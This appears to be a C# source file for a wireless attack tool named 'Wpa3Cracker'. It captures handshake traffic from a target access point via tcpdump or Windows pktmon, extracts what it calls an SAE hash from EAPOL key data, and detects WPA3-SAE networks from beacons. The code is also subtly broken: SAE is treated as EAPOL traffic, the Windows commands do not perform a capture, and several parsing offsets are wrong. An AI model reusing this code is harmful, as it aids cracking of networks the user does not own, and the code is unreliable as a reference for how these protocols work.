using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HackItWireless
{
    public sealed class Wpa3Cracker
    {
        public async Task<bool> CaptureSaeHandshake(string interfaceName, string bssid, string outputFile, int timeoutSec = 30)
        {
            if (string.IsNullOrWhiteSpace(interfaceName))
                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
            if (string.IsNullOrWhiteSpace(outputFile))
                throw new ArgumentException("Output file path cannot be null or empty.", nameof(outputFile));

            string tempPcap = Path.Combine(Path.GetTempPath(), $"sae_{Guid.NewGuid():N}.pcap");

            try
            {
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan set network mode=bssid interface=\"{interfaceName}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                    };
                    using var proc = Process.Start(psi);
                    if (proc != null)
                    {
                        await proc.WaitForExitAsync().ConfigureAwait(false);
                    }

                    var capturePsi = new ProcessStartInfo
                    {
                        FileName = "pktmon",
                        Arguments = $"filter add -t pcap -i \"{interfaceName}\" -o \"{tempPcap}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    };
                    using var capProc = Process.Start(capturePsi);
                    if (capProc != null)
                    {
                        await Task.Delay(timeoutSec * 1000).ConfigureAwait(false);
                        capProc.Kill();
                    }
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "timeout",
                        Arguments = $"{timeoutSec} tcpdump -i \"{interfaceName}\" -w \"{tempPcap}\" " +
                                    $"\"ether host {bssid} and ether proto 0x888e\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                    };
                    using var proc = Process.Start(psi);
                    if (proc != null)
                    {
                        await proc.WaitForExitAsync().ConfigureAwait(false);
                    }
                }
                else
                {
                    throw new PlatformNotSupportedException("SAE handshake capture is only supported on Windows and Linux.");
                }

                if (File.Exists(tempPcap))
                {
                    File.Copy(tempPcap, outputFile, true);
                    return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
            finally
            {
                if (File.Exists(tempPcap))
                {
                    try { File.Delete(tempPcap); } catch { }
                }
            }
        }

        public string ExtractSaeHash(byte[] packetData)
        {
            if (packetData == null || packetData.Length < 54)
                return string.Empty;

            int offset = 14;
            if (packetData.Length < offset + 99)
                return string.Empty;

            if (packetData[offset + 2] != 3)
                return string.Empty;

            ushort keyInfo = BinaryPrimitives.ReadUInt16LittleEndian(packetData.AsSpan(offset + 7, 2));
            if ((keyInfo & 0x0200) == 0)
                return string.Empty;

            ushort keyDataLen = BinaryPrimitives.ReadUInt16LittleEndian(packetData.AsSpan(offset + 101, 2));
            if (keyDataLen < 20)
                return string.Empty;

            offset += 103;

            int pos = offset;
            while (pos + 2 <= offset + keyDataLen)
            {
                byte elemId = packetData[pos];
                byte elemLen = packetData[pos + 1];

                if (pos + 2 + elemLen > offset + keyDataLen)
                    break;

                if (elemId == 0xDD && elemLen >= 6)
                {
                    byte[] oui = packetData.AsSpan(pos + 2, 3).ToArray();
                    if (oui[0] == 0x00 && oui[1] == 0x0F && oui[2] == 0xAC && packetData[pos + 5] == 0x04)
                    {
                        int dataStart = pos + 6;
                        int dataLen = Math.Min(elemLen - 4, 32);
                        return Convert.ToHexString(packetData, dataStart, dataLen).ToLowerInvariant();
                    }
                }

                pos += 2 + elemLen;
            }

            return string.Empty;
        }

        public bool DetectWpa3FromBeacon(byte[] beaconData)
        {
            if (beaconData == null || beaconData.Length < 36)
                return false;

            int offset = 0;
            if (beaconData.Length < 24)
                return false;

            byte frameType = (byte)(beaconData[offset] & 0x0C);
            if (frameType != 0x08)
                return false;

            offset += 36;

            int fixedParamsEnd = Math.Min(offset + 12, beaconData.Length);
            offset = fixedParamsEnd;

            while (offset + 2 <= beaconData.Length)
            {
                byte elemId = beaconData[offset];
                byte elemLen = beaconData[offset + 1];

                if (offset + 2 + elemLen > beaconData.Length)
                    break;

                if (elemId == 0x30 && elemLen >= 2)
                {
                    int rsnOffset = offset + 2;
                    int rsnEnd = offset + 2 + elemLen;

                    if (rsnOffset + 4 > rsnEnd)
                        return false;

                    ushort version = BinaryPrimitives.ReadUInt16LittleEndian(
                        beaconData.AsSpan(rsnOffset, 2));
                    if (version != 1)
                        return false;

                    rsnOffset += 2;

                    int groupCipherOuiCount = rsnOffset + 4;
                    if (groupCipherOuiCount > rsnEnd)
                        return false;

                    ushort pairwiseCount = BinaryPrimitives.ReadUInt16LittleEndian(
                        beaconData.AsSpan(groupCipherOuiCount, 2));
                    rsnOffset = groupCipherOuiCount + 2 + pairwiseCount * 4;

                    if (rsnOffset + 2 > rsnEnd)
                        return false;

                    ushort akmCount = BinaryPrimitives.ReadUInt16LittleEndian(
                        beaconData.AsSpan(rsnOffset, 2));
                    rsnOffset += 2;

                    for (int i = 0; i < akmCount; i++)
                    {
                        if (rsnOffset + 4 > rsnEnd)
                            break;

                        byte[] oui = beaconData.AsSpan(rsnOffset, 3).ToArray();
                        byte akmType = beaconData[rsnOffset + 3];

                        if (oui[0] == 0x00 && oui[1] == 0x0F && oui[2] == 0xAC && akmType == 8)
                            return true;

                        rsnOffset += 4;
                    }
                }

                offset += 2 + elemLen;
            }

            return false;
        }
    }
}
